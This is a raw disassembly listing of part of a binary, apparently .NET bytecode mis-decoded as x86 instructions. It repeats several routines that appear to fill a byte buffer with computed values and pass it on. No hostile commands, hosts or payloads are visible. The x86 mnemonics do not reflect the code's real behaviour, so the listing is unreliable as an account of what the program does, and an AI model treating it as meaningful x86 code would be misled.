  4035a0:	63 61 11             	arpl   %esp,0x11(%ecx)
  4035a3:	09 5a d2             	or     %ebx,-0x2e(%edx)
  4035a6:	9c                   	pushf
  4035a7:	11 09                	adc    %ecx,(%ecx)
  4035a9:	17                   	pop    %ss
  4035aa:	58                   	pop    %eax
  4035ab:	13 09                	adc    (%ecx),%ecx
  4035ad:	11 09                	adc    %ecx,(%ecx)
  4035af:	11 07                	adc    %eax,(%edi)
  4035b1:	8e 69 32             	mov    0x32(%ecx),%gs
  4035b4:	d1 08                	rorl   $1,(%eax)
  4035b6:	11 07                	adc    %eax,(%edi)
  4035b8:	8e 69 09             	mov    0x9(%ecx),%gs
  4035bb:	5a                   	pop    %edx
  4035bc:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4035c2:	7a 00                	jp     0x4035c4
  4035c4:	00 0a                	add    %cl,(%edx)
  4035c6:	11 07                	adc    %eax,(%edi)
  4035c8:	13 0a                	adc    (%edx),%ecx
  4035ca:	16                   	push   %ss
  4035cb:	13 0b                	adc    (%ebx),%ecx
  4035cd:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  4035d3:	91                   	xchg   %eax,%ecx
  4035d4:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  4035d7:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  4035da:	7c 00                	jl     0x4035dc
  4035dc:	00 0a                	add    %cl,(%edx)
  4035de:	11 0b                	adc    %ecx,(%ebx)
  4035e0:	17                   	pop    %ss
  4035e1:	58                   	pop    %eax
  4035e2:	13 0b                	adc    (%ebx),%ecx
  4035e4:	11 0b                	adc    %ecx,(%ebx)
  4035e6:	11 0a                	adc    %ecx,(%edx)
  4035e8:	8e 69 32             	mov    0x32(%ecx),%gs
  4035eb:	e3 08                	jecxz  0x4035f5
  4035ed:	1a 16                	sbb    (%esi),%dl
  4035ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f0:	7d 00                	jge    0x4035f2
  4035f2:	00 0a                	add    %cl,(%edx)
  4035f4:	26 08 08             	or     %cl,%es:(%eax)
  4035f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f8:	7e 00                	jle    0x4035fa
  4035fa:	00 0a                	add    %cl,(%edx)
  4035fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035fd:	7f 00                	jg     0x4035ff
  4035ff:	00 0a                	add    %cl,(%edx)
  403601:	1e                   	push   %ds
  403602:	6a 59                	push   $0x59
  403604:	6d                   	insl   (%dx),%es:(%edi)
  403605:	6f                   	outsl  %ds:(%esi),(%dx)
  403606:	7a 00                	jp     0x403608
  403608:	00 0a                	add    %cl,(%edx)
  40360a:	07                   	pop    %es
  40360b:	16                   	push   %ss
  40360c:	6a 16                	push   $0x16
  40360e:	6f                   	outsl  %ds:(%esi),(%dx)
  40360f:	80 00 00             	addb   $0x0,(%eax)
  403612:	0a 26                	or     (%esi),%ah
  403614:	07                   	pop    %es
  403615:	73 81                	jae    0x403598
  403617:	00 00                	add    %al,(%eax)
  403619:	0a 28                	or     (%eax),%ch
  40361b:	82 00 00             	addb   $0x0,(%eax)
  40361e:	0a de                	or     %dh,%bl
  403620:	0a 07                	or     (%edi),%al
  403622:	2c 06                	sub    $0x6,%al
  403624:	07                   	pop    %es
  403625:	6f                   	outsl  %ds:(%esi),(%dx)
  403626:	55                   	push   %ebp
  403627:	00 00                	add    %al,(%eax)
  403629:	0a dc                	or     %ah,%bl
  40362b:	2a 41 1c             	sub    0x1c(%ecx),%al
  40362e:	00 00                	add    %al,(%eax)
  403630:	02 00                	add    (%eax),%al
  403632:	00 00                	add    %al,(%eax)
  403634:	0c 00                	or     $0x0,%al
  403636:	00 00                	add    %al,(%eax)
  403638:	99                   	cltd
  403639:	01 00                	add    %eax,(%eax)
  40363b:	00 a5 01 00 00 0a    	add    %ah,0xa000001(%ebp)
  403641:	00 00                	add    %al,(%eax)
  403643:	00 00                	add    %al,(%eax)
  403645:	00 00                	add    %al,(%eax)
  403647:	00 1b                	add    %bl,(%ebx)
  403649:	30 07                	xor    %al,(%edi)
  40364b:	00 c0                	add    %al,%al
  40364d:	01 00                	add    %eax,(%eax)
  40364f:	00 10                	add    %dl,(%eax)
  403651:	00 00                	add    %al,(%eax)
  403653:	11 73 53             	adc    %esi,0x53(%ebx)
  403656:	00 00                	add    %al,(%eax)
  403658:	0a 0a                	or     (%edx),%cl
  40365a:	73 76                	jae    0x4036d2
  40365c:	00 00                	add    %al,(%eax)
  40365e:	0a 0b                	or     (%ebx),%cl
  403660:	07                   	pop    %es
  403661:	73 77                	jae    0x4036da
  403663:	00 00                	add    %al,(%eax)
  403665:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403668:	72 cb                	jb     0x403635
  40366a:	04 00                	add    $0x0,%al
  40366c:	70 28                	jo     0x403696
  40366e:	78 00                	js     0x403670
  403670:	00 0a                	add    %cl,(%edx)
  403672:	6f                   	outsl  %ds:(%esi),(%dx)
  403673:	79 00                	jns    0x403675
  403675:	00 0a                	add    %cl,(%edx)
  403677:	08 16                	or     %dl,(%esi)
  403679:	6f                   	outsl  %ds:(%esi),(%dx)
  40367a:	7a 00                	jp     0x40367c
  40367c:	00 0a                	add    %cl,(%edx)
  40367e:	08 72 d5             	or     %dh,-0x2b(%edx)
  403681:	04 00                	add    $0x0,%al
  403683:	70 28                	jo     0x4036ad
  403685:	78 00                	js     0x403687
  403687:	00 0a                	add    %cl,(%edx)
  403689:	6f                   	outsl  %ds:(%esi),(%dx)
  40368a:	79 00                	jns    0x40368c
  40368c:	00 0a                	add    %cl,(%edx)
  40368e:	08 72 df             	or     %dh,-0x21(%edx)
  403691:	04 00                	add    $0x0,%al
  403693:	70 28                	jo     0x4036bd
  403695:	78 00                	js     0x403697
  403697:	00 0a                	add    %cl,(%edx)
  403699:	6f                   	outsl  %ds:(%esi),(%dx)
  40369a:	79 00                	jns    0x40369c
  40369c:	00 0a                	add    %cl,(%edx)
  40369e:	08 1f                	or     %bl,(%edi)
  4036a0:	10 6f 7a             	adc    %ch,0x7a(%edi)
  4036a3:	00 00                	add    %al,(%eax)
  4036a5:	0a 08                	or     (%eax),%cl
  4036a7:	17                   	pop    %ss
  4036a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a9:	7b 00                	jnp    0x4036ab
  4036ab:	00 0a                	add    %cl,(%edx)
  4036ad:	17                   	pop    %ss
  4036ae:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  4036b3:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  4036b9:	7b 00                	jnp    0x4036bb
  4036bb:	00 0a                	add    %cl,(%edx)
  4036bd:	08 11                	or     %dl,(%ecx)
  4036bf:	04 6f                	add    $0x6f,%al
  4036c1:	7a 00                	jp     0x4036c3
  4036c3:	00 0a                	add    %cl,(%edx)
  4036c5:	08 11                	or     %dl,(%ecx)
  4036c7:	04 09                	add    $0x9,%al
  4036c9:	5a                   	pop    %edx
  4036ca:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4036d0:	7a 00                	jp     0x4036d2
  4036d2:	00 0a                	add    %cl,(%edx)
  4036d4:	08 09                	or     %cl,(%ecx)
  4036d6:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  4036dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4036dd:	7b 00                	jnp    0x4036df
  4036df:	00 0a                	add    %cl,(%edx)
  4036e1:	08 11                	or     %dl,(%ecx)
  4036e3:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  4036e8:	00 0a                	add    %cl,(%edx)
  4036ea:	08 72 e9             	or     %dh,-0x17(%edx)
  4036ed:	04 00                	add    $0x0,%al
  4036ef:	70 28                	jo     0x403719
  4036f1:	78 00                	js     0x4036f3
  4036f3:	00 0a                	add    %cl,(%edx)
  4036f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f6:	79 00                	jns    0x4036f8
  4036f8:	00 0a                	add    %cl,(%edx)
  4036fa:	03 13                	add    (%ebx),%edx
  4036fc:	06                   	push   %es
  4036fd:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403700:	06                   	push   %es
  403701:	5a                   	pop    %edx
  403702:	8d 42 00             	lea    0x0(%edx),%eax
  403705:	00 01                	add    %al,(%ecx)
  403707:	13 07                	adc    (%edi),%eax
  403709:	1c 8d                	sbb    $0x8d,%al
  40370b:	48                   	dec    %eax
  40370c:	00 00                	add    %al,(%eax)
  40370e:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  403714:	11 6f 70             	adc    %ebp,0x70(%edi)
  403717:	00 00                	add    %al,(%eax)
  403719:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  40371f:	1f                   	pop    %ds
  403720:	11 6f 70             	adc    %ebp,0x70(%edi)
  403723:	00 00                	add    %al,(%eax)
  403725:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  40372b:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  403731:	70 00                	jo     0x403733
  403733:	00 0a                	add    %cl,(%edx)
  403735:	9e                   	sahf
  403736:	25 19 06 17 1f       	and    $0x1f170619,%eax
  40373b:	11 6f 70             	adc    %ebp,0x70(%edi)
  40373e:	00 00                	add    %al,(%eax)
  403740:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  403746:	1f                   	pop    %ds
  403747:	11 6f 70             	adc    %ebp,0x70(%edi)
  40374a:	00 00                	add    %al,(%eax)
  40374c:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403752:	1f                   	pop    %ds
  403753:	11 6f 70             	adc    %ebp,0x70(%edi)
  403756:	00 00                	add    %al,(%eax)
  403758:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  40375e:	09 2b                	or     %ebp,(%ebx)
  403760:	34 11                	xor    $0x11,%al
  403762:	07                   	pop    %es
  403763:	11 09                	adc    %ecx,(%ecx)
  403765:	11 09                	adc    %ecx,(%ecx)
  403767:	11 09                	adc    %ecx,(%ecx)
  403769:	11 08                	adc    %ecx,(%eax)
  40376b:	16                   	push   %ss
  40376c:	94                   	xchg   %eax,%esp
  40376d:	1f                   	pop    %ds
  40376e:	1f                   	pop    %ds
  40376f:	5f                   	pop    %edi
  403770:	63 11                	arpl   %edx,(%ecx)
  403772:	09 11                	or     %edx,(%ecx)
  403774:	08 17                	or     %dl,(%edi)
  403776:	94                   	xchg   %eax,%esp
  403777:	1f                   	pop    %ds
  403778:	1f                   	pop    %ds
  403779:	5f                   	pop    %edi
  40377a:	63 60 11             	arpl   %esp,0x11(%eax)
  40377d:	08 18                	or     %bl,(%eax)
  40377f:	94                   	xchg   %eax,%esp
  403780:	5f                   	pop    %edi
  403781:	11 09                	adc    %ecx,(%ecx)
  403783:	11 08                	adc    %ecx,(%eax)
  403785:	19 94 1f 1f 5f 63 5f 	sbb    %edx,0x5f635f1f(%edi,%ebx,1)
  40378c:	5a                   	pop    %edx
  40378d:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  403794:	09 11                	or     %edx,(%ecx)
  403796:	09 11                	or     %edx,(%ecx)
  403798:	07                   	pop    %es
  403799:	8e 69 32             	mov    0x32(%ecx),%gs
  40379c:	c4 08                	les    (%eax),%ecx
  40379e:	11 07                	adc    %eax,(%edi)
  4037a0:	8e 69 09             	mov    0x9(%ecx),%gs
  4037a3:	5a                   	pop    %edx
  4037a4:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4037aa:	7a 00                	jp     0x4037ac
  4037ac:	00 0a                	add    %cl,(%edx)
  4037ae:	11 07                	adc    %eax,(%edi)
  4037b0:	13 0a                	adc    (%edx),%ecx
  4037b2:	16                   	push   %ss
  4037b3:	13 0b                	adc    (%ebx),%ecx
  4037b5:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  4037bb:	91                   	xchg   %eax,%ecx
  4037bc:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  4037bf:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	11 0b                	adc    %ecx,(%ebx)
  4037c8:	17                   	pop    %ss
  4037c9:	58                   	pop    %eax
  4037ca:	13 0b                	adc    (%ebx),%ecx
  4037cc:	11 0b                	adc    %ecx,(%ebx)
  4037ce:	11 0a                	adc    %ecx,(%edx)
  4037d0:	8e 69 32             	mov    0x32(%ecx),%gs
  4037d3:	e3 08                	jecxz  0x4037dd
  4037d5:	1a 16                	sbb    (%esi),%dl
  4037d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d8:	7d 00                	jge    0x4037da
  4037da:	00 0a                	add    %cl,(%edx)
  4037dc:	26 08 08             	or     %cl,%es:(%eax)
  4037df:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e0:	7e 00                	jle    0x4037e2
  4037e2:	00 0a                	add    %cl,(%edx)
  4037e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e5:	7f 00                	jg     0x4037e7
  4037e7:	00 0a                	add    %cl,(%edx)
  4037e9:	1e                   	push   %ds
  4037ea:	6a 59                	push   $0x59
  4037ec:	6d                   	insl   (%dx),%es:(%edi)
  4037ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ee:	7a 00                	jp     0x4037f0
  4037f0:	00 0a                	add    %cl,(%edx)
  4037f2:	07                   	pop    %es
  4037f3:	16                   	push   %ss
  4037f4:	6a 16                	push   $0x16
  4037f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f7:	80 00 00             	addb   $0x0,(%eax)
  4037fa:	0a 26                	or     (%esi),%ah
  4037fc:	07                   	pop    %es
  4037fd:	73 81                	jae    0x403780
  4037ff:	00 00                	add    %al,(%eax)
  403801:	0a 28                	or     (%eax),%ch
  403803:	82 00 00             	addb   $0x0,(%eax)
  403806:	0a de                	or     %dh,%bl
  403808:	0a 07                	or     (%edi),%al
  40380a:	2c 06                	sub    $0x6,%al
  40380c:	07                   	pop    %es
  40380d:	6f                   	outsl  %ds:(%esi),(%dx)
  40380e:	55                   	push   %ebp
  40380f:	00 00                	add    %al,(%eax)
  403811:	0a dc                	or     %ah,%bl
  403813:	2a 41 1c             	sub    0x1c(%ecx),%al
  403816:	00 00                	add    %al,(%eax)
  403818:	02 00                	add    (%eax),%al
  40381a:	00 00                	add    %al,(%eax)
  40381c:	0c 00                	or     $0x0,%al
  40381e:	00 00                	add    %al,(%eax)
  403820:	a9 01 00 00 b5       	test   $0xb5000001,%eax
  403825:	01 00                	add    %eax,(%eax)
  403827:	00 0a                	add    %cl,(%edx)
  403829:	00 00                	add    %al,(%eax)
  40382b:	00 00                	add    %al,(%eax)
  40382d:	00 00                	add    %al,(%eax)
  40382f:	00 1b                	add    %bl,(%ebx)
  403831:	30 07                	xor    %al,(%edi)
  403833:	00 b8 01 00 00 10    	add    %bh,0x10000001(%eax)
  403839:	00 00                	add    %al,(%eax)
  40383b:	11 73 53             	adc    %esi,0x53(%ebx)
  40383e:	00 00                	add    %al,(%eax)
  403840:	0a 0a                	or     (%edx),%cl
  403842:	73 76                	jae    0x4038ba
  403844:	00 00                	add    %al,(%eax)
  403846:	0a 0b                	or     (%ebx),%cl
  403848:	07                   	pop    %es
  403849:	73 77                	jae    0x4038c2
  40384b:	00 00                	add    %al,(%eax)
  40384d:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403850:	72 cb                	jb     0x40381d
  403852:	04 00                	add    $0x0,%al
  403854:	70 28                	jo     0x40387e
  403856:	78 00                	js     0x403858
  403858:	00 0a                	add    %cl,(%edx)
  40385a:	6f                   	outsl  %ds:(%esi),(%dx)
  40385b:	79 00                	jns    0x40385d
  40385d:	00 0a                	add    %cl,(%edx)
  40385f:	08 16                	or     %dl,(%esi)
  403861:	6f                   	outsl  %ds:(%esi),(%dx)
  403862:	7a 00                	jp     0x403864
  403864:	00 0a                	add    %cl,(%edx)
  403866:	08 72 d5             	or     %dh,-0x2b(%edx)
  403869:	04 00                	add    $0x0,%al
  40386b:	70 28                	jo     0x403895
  40386d:	78 00                	js     0x40386f
  40386f:	00 0a                	add    %cl,(%edx)
  403871:	6f                   	outsl  %ds:(%esi),(%dx)
  403872:	79 00                	jns    0x403874
  403874:	00 0a                	add    %cl,(%edx)
  403876:	08 72 df             	or     %dh,-0x21(%edx)
  403879:	04 00                	add    $0x0,%al
  40387b:	70 28                	jo     0x4038a5
  40387d:	78 00                	js     0x40387f
  40387f:	00 0a                	add    %cl,(%edx)
  403881:	6f                   	outsl  %ds:(%esi),(%dx)
  403882:	79 00                	jns    0x403884
  403884:	00 0a                	add    %cl,(%edx)
  403886:	08 1f                	or     %bl,(%edi)
  403888:	10 6f 7a             	adc    %ch,0x7a(%edi)
  40388b:	00 00                	add    %al,(%eax)
  40388d:	0a 08                	or     (%eax),%cl
  40388f:	17                   	pop    %ss
  403890:	6f                   	outsl  %ds:(%esi),(%dx)
  403891:	7b 00                	jnp    0x403893
  403893:	00 0a                	add    %cl,(%edx)
  403895:	17                   	pop    %ss
  403896:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  40389b:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  4038a1:	7b 00                	jnp    0x4038a3
  4038a3:	00 0a                	add    %cl,(%edx)
  4038a5:	08 11                	or     %dl,(%ecx)
  4038a7:	04 6f                	add    $0x6f,%al
  4038a9:	7a 00                	jp     0x4038ab
  4038ab:	00 0a                	add    %cl,(%edx)
  4038ad:	08 11                	or     %dl,(%ecx)
  4038af:	04 09                	add    $0x9,%al
  4038b1:	5a                   	pop    %edx
  4038b2:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4038b8:	7a 00                	jp     0x4038ba
  4038ba:	00 0a                	add    %cl,(%edx)
  4038bc:	08 09                	or     %cl,(%ecx)
  4038be:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  4038c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c5:	7b 00                	jnp    0x4038c7
  4038c7:	00 0a                	add    %cl,(%edx)
  4038c9:	08 11                	or     %dl,(%ecx)
  4038cb:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  4038d0:	00 0a                	add    %cl,(%edx)
  4038d2:	08 72 e9             	or     %dh,-0x17(%edx)
  4038d5:	04 00                	add    $0x0,%al
  4038d7:	70 28                	jo     0x403901
  4038d9:	78 00                	js     0x4038db
  4038db:	00 0a                	add    %cl,(%edx)
  4038dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4038de:	79 00                	jns    0x4038e0
  4038e0:	00 0a                	add    %cl,(%edx)
  4038e2:	03 13                	add    (%ebx),%edx
  4038e4:	06                   	push   %es
  4038e5:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  4038e8:	06                   	push   %es
  4038e9:	5a                   	pop    %edx
  4038ea:	8d 42 00             	lea    0x0(%edx),%eax
  4038ed:	00 01                	add    %al,(%ecx)
  4038ef:	13 07                	adc    (%edi),%eax
  4038f1:	1c 8d                	sbb    $0x8d,%al
  4038f3:	48                   	dec    %eax
  4038f4:	00 00                	add    %al,(%eax)
  4038f6:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  4038fc:	11 6f 70             	adc    %ebp,0x70(%edi)
  4038ff:	00 00                	add    %al,(%eax)
  403901:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403907:	1f                   	pop    %ds
  403908:	11 6f 70             	adc    %ebp,0x70(%edi)
  40390b:	00 00                	add    %al,(%eax)
  40390d:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403913:	1f                   	pop    %ds
  403914:	11 6f 70             	adc    %ebp,0x70(%edi)
  403917:	00 00                	add    %al,(%eax)
  403919:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  40391f:	1f                   	pop    %ds
  403920:	11 6f 70             	adc    %ebp,0x70(%edi)
  403923:	00 00                	add    %al,(%eax)
  403925:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  40392b:	1f                   	pop    %ds
  40392c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40392f:	00 00                	add    %al,(%eax)
  403931:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403937:	1f                   	pop    %ds
  403938:	11 6f 70             	adc    %ebp,0x70(%edi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  403943:	09 2b                	or     %ebp,(%ebx)
  403945:	2f                   	das
  403946:	11 07                	adc    %eax,(%edi)
  403948:	11 09                	adc    %ecx,(%ecx)
  40394a:	11 09                	adc    %ecx,(%ecx)
  40394c:	11 09                	adc    %ecx,(%ecx)
  40394e:	11 08                	adc    %ecx,(%eax)
  403950:	16                   	push   %ss
  403951:	94                   	xchg   %eax,%esp
  403952:	1f                   	pop    %ds
  403953:	1f                   	pop    %ds
  403954:	5f                   	pop    %edi
  403955:	63 5f 11             	arpl   %ebx,0x11(%edi)
  403958:	09 11                	or     %edx,(%ecx)
  40395a:	08 17                	or     %dl,(%edi)
  40395c:	94                   	xchg   %eax,%esp
  40395d:	1f                   	pop    %ds
  40395e:	1f                   	pop    %ds
  40395f:	5f                   	pop    %edi
  403960:	63 11                	arpl   %edx,(%ecx)
  403962:	09 11                	or     %edx,(%ecx)
  403964:	08 18                	or     %bl,(%eax)
  403966:	94                   	xchg   %eax,%esp
  403967:	1f                   	pop    %ds
  403968:	1f                   	pop    %ds
  403969:	5f                   	pop    %edi
  40396a:	63 60 5a             	arpl   %esp,0x5a(%eax)
  40396d:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  403974:	09 11                	or     %edx,(%ecx)
  403976:	09 11                	or     %edx,(%ecx)
  403978:	07                   	pop    %es
  403979:	8e 69 32             	mov    0x32(%ecx),%gs
  40397c:	c9                   	leave
  40397d:	08 11                	or     %dl,(%ecx)
  40397f:	07                   	pop    %es
  403980:	8e 69 09             	mov    0x9(%ecx),%gs
  403983:	5a                   	pop    %edx
  403984:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  40398a:	7a 00                	jp     0x40398c
  40398c:	00 0a                	add    %cl,(%edx)
  40398e:	11 07                	adc    %eax,(%edi)
  403990:	13 0a                	adc    (%edx),%ecx
  403992:	16                   	push   %ss
  403993:	13 0b                	adc    (%ebx),%ecx
  403995:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  40399b:	91                   	xchg   %eax,%ecx
  40399c:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  40399f:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  4039a2:	7c 00                	jl     0x4039a4
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	11 0b                	adc    %ecx,(%ebx)
  4039a8:	17                   	pop    %ss
  4039a9:	58                   	pop    %eax
  4039aa:	13 0b                	adc    (%ebx),%ecx
  4039ac:	11 0b                	adc    %ecx,(%ebx)
  4039ae:	11 0a                	adc    %ecx,(%edx)
  4039b0:	8e 69 32             	mov    0x32(%ecx),%gs
  4039b3:	e3 08                	jecxz  0x4039bd
  4039b5:	1a 16                	sbb    (%esi),%dl
  4039b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4039b8:	7d 00                	jge    0x4039ba
  4039ba:	00 0a                	add    %cl,(%edx)
  4039bc:	26 08 08             	or     %cl,%es:(%eax)
  4039bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c0:	7e 00                	jle    0x4039c2
  4039c2:	00 0a                	add    %cl,(%edx)
  4039c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c5:	7f 00                	jg     0x4039c7
  4039c7:	00 0a                	add    %cl,(%edx)
  4039c9:	1e                   	push   %ds
  4039ca:	6a 59                	push   $0x59
  4039cc:	6d                   	insl   (%dx),%es:(%edi)
  4039cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ce:	7a 00                	jp     0x4039d0
  4039d0:	00 0a                	add    %cl,(%edx)
  4039d2:	07                   	pop    %es
  4039d3:	16                   	push   %ss
  4039d4:	6a 16                	push   $0x16
  4039d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d7:	80 00 00             	addb   $0x0,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	73 81                	jae    0x403960
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	0a 28                	or     (%eax),%ch
  4039e3:	82 00 00             	addb   $0x0,(%eax)
  4039e6:	0a de                	or     %dh,%bl
  4039e8:	0a 07                	or     (%edi),%al
  4039ea:	2c 06                	sub    $0x6,%al
  4039ec:	07                   	pop    %es
  4039ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ee:	55                   	push   %ebp
  4039ef:	00 00                	add    %al,(%eax)
  4039f1:	0a dc                	or     %ah,%bl
  4039f3:	2a 41 1c             	sub    0x1c(%ecx),%al
  4039f6:	00 00                	add    %al,(%eax)
  4039f8:	02 00                	add    (%eax),%al
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	0c 00                	or     $0x0,%al
  4039fe:	00 00                	add    %al,(%eax)
  403a00:	a1 01 00 00 ad       	mov    0xad000001,%eax
  403a05:	01 00                	add    %eax,(%eax)
  403a07:	00 0a                	add    %cl,(%edx)
  403a09:	00 00                	add    %al,(%eax)
  403a0b:	00 00                	add    %al,(%eax)
  403a0d:	00 00                	add    %al,(%eax)
  403a0f:	00 1b                	add    %bl,(%ebx)
  403a11:	30 08                	xor    %cl,(%eax)
  403a13:	00 c3                	add    %al,%bl
  403a15:	01 00                	add    %eax,(%eax)
  403a17:	00 10                	add    %dl,(%eax)
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	11 73 53             	adc    %esi,0x53(%ebx)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	0a 0a                	or     (%edx),%cl
  403a22:	73 76                	jae    0x403a9a
  403a24:	00 00                	add    %al,(%eax)
  403a26:	0a 0b                	or     (%ebx),%cl
  403a28:	07                   	pop    %es
  403a29:	73 77                	jae    0x403aa2
  403a2b:	00 00                	add    %al,(%eax)
  403a2d:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a30:	72 cb                	jb     0x4039fd
  403a32:	04 00                	add    $0x0,%al
  403a34:	70 28                	jo     0x403a5e
  403a36:	78 00                	js     0x403a38
  403a38:	00 0a                	add    %cl,(%edx)
  403a3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3b:	79 00                	jns    0x403a3d
  403a3d:	00 0a                	add    %cl,(%edx)
  403a3f:	08 16                	or     %dl,(%esi)
  403a41:	6f                   	outsl  %ds:(%esi),(%dx)
  403a42:	7a 00                	jp     0x403a44
  403a44:	00 0a                	add    %cl,(%edx)
  403a46:	08 72 d5             	or     %dh,-0x2b(%edx)
  403a49:	04 00                	add    $0x0,%al
  403a4b:	70 28                	jo     0x403a75
  403a4d:	78 00                	js     0x403a4f
  403a4f:	00 0a                	add    %cl,(%edx)
  403a51:	6f                   	outsl  %ds:(%esi),(%dx)
  403a52:	79 00                	jns    0x403a54
  403a54:	00 0a                	add    %cl,(%edx)
  403a56:	08 72 df             	or     %dh,-0x21(%edx)
  403a59:	04 00                	add    $0x0,%al
  403a5b:	70 28                	jo     0x403a85
  403a5d:	78 00                	js     0x403a5f
  403a5f:	00 0a                	add    %cl,(%edx)
  403a61:	6f                   	outsl  %ds:(%esi),(%dx)
  403a62:	79 00                	jns    0x403a64
  403a64:	00 0a                	add    %cl,(%edx)
  403a66:	08 1f                	or     %bl,(%edi)
  403a68:	10 6f 7a             	adc    %ch,0x7a(%edi)
  403a6b:	00 00                	add    %al,(%eax)
  403a6d:	0a 08                	or     (%eax),%cl
  403a6f:	17                   	pop    %ss
  403a70:	6f                   	outsl  %ds:(%esi),(%dx)
  403a71:	7b 00                	jnp    0x403a73
  403a73:	00 0a                	add    %cl,(%edx)
  403a75:	17                   	pop    %ss
  403a76:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  403a7b:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  403a81:	7b 00                	jnp    0x403a83
  403a83:	00 0a                	add    %cl,(%edx)
  403a85:	08 11                	or     %dl,(%ecx)
  403a87:	04 6f                	add    $0x6f,%al
  403a89:	7a 00                	jp     0x403a8b
  403a8b:	00 0a                	add    %cl,(%edx)
  403a8d:	08 11                	or     %dl,(%ecx)
  403a8f:	04 09                	add    $0x9,%al
  403a91:	5a                   	pop    %edx
  403a92:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403a98:	7a 00                	jp     0x403a9a
  403a9a:	00 0a                	add    %cl,(%edx)
  403a9c:	08 09                	or     %cl,(%ecx)
  403a9e:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403aa4:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa5:	7b 00                	jnp    0x403aa7
  403aa7:	00 0a                	add    %cl,(%edx)
  403aa9:	08 11                	or     %dl,(%ecx)
  403aab:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403ab0:	00 0a                	add    %cl,(%edx)
  403ab2:	08 72 e9             	or     %dh,-0x17(%edx)
  403ab5:	04 00                	add    $0x0,%al
  403ab7:	70 28                	jo     0x403ae1
  403ab9:	78 00                	js     0x403abb
  403abb:	00 0a                	add    %cl,(%edx)
  403abd:	6f                   	outsl  %ds:(%esi),(%dx)
  403abe:	79 00                	jns    0x403ac0
  403ac0:	00 0a                	add    %cl,(%edx)
  403ac2:	03 13                	add    (%ebx),%edx
  403ac4:	06                   	push   %es
  403ac5:	11 04 11             	adc    %eax,(%ecx,%edx,1)
